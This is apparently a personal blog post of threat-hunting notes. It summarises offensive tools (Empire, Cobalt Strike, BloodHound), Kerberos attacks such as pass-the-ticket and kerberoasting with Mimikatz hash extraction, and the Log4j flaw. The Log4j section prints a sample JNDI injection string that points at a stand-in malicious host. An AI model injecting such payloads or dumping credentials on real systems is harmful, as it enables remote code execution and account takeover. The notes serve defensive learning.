---
layout: post
title:  "Threat hunting Tools attacks & Vulnerability"
date:   2022-01-01 13:11:40 -0400
categories: Threat Tools attacks & Vulnerability 
---

Threat hunting Tools, attacks & Vulnerability

Empire vs Metasploit: 
- Empire is “a pure PowerShell post-exploitation agent built on cryptologically-secure communications and flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.” Basically, Empire is a tool that is similar to Metasploit but specific to PowerShell. It allows you to run PowerShell scripts in memory and make a connection back to your machine. 
- The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development

Blood hound
- An application used to visualize active directory environments. It’s a tool allowing for the analysis of AD rights and relations, focusing on the ones that an attacker may abuse. After collecting AD data using one of the available ingestors, BloodHound will map out AD objects (users, groups, computers, …) and accesses and query these relationships in order to discern those that may lead to privilege escalation, lateral movement, etc.

Cobalt strike - how to detect cobalt strike behaviour in an environment
- It’s a commercial, full-featured, remote access tool that bills itself as "adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors". Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.[1]
- In addition to its own capabilities, Cobalt Strike leverages the capabilities of other well-known tools such as Metasploit and Mimikatz.[1]

Kerberos attack.
- Kerberos is used in Active Directory.
- an authentication protocol, not authorization.
- Kerberos uses either UDP or TCP as transport protocol, which sends data in cleartext. Due to this Kerberos is responsible for providing encryption.
- Ports used by Kerberos are UDP/88 and TCP/88, which should be listen in KDC
- Attacks
- Overpass The Hash/Pass the Key (PTK): attack consist in using the user hash to impersonate the specific user. If an attacker gets the hash of any user, he could impersonate him against the KDC and then gain access to several services. [User hashes can be extracted from SAM files in workstations or NTDS.DIT file of DCs, as well as from the lsass process memory (by using Mimikatz) where it is also possible to find cleartext passwords.]
- Pass The Ticket (PTT): It is possible obtain the ticket performing a Man-In-The-Middle attack, due to the fact that Kerberos is sent over TCP or UDP. However, this technique does not allow get access to session key. An alternative is getting the ticket from lsass process memory, where also reside the session key. This procediment could be performed with Mimikatz.
- Kerberoasting: a technique which takes advantage of TGS to crack the user accounts passwords offline.

Log4j Vulnerability
- Attacker supply special text in an HTTP User-Agent header or a simple POST form request, with the usual form: ${jndi:ldap://maliciouslhost.com/resource
- The log4j vulnerability parses this and reaches out to the malicious host via the “Java Naming and Directory Interface” (JNDI). The first-stage resource acts as a springboard to another attacker-controlled endpoint, which serves Java code to be executed on the original victim.

Reference
- Mitre ATT&CK
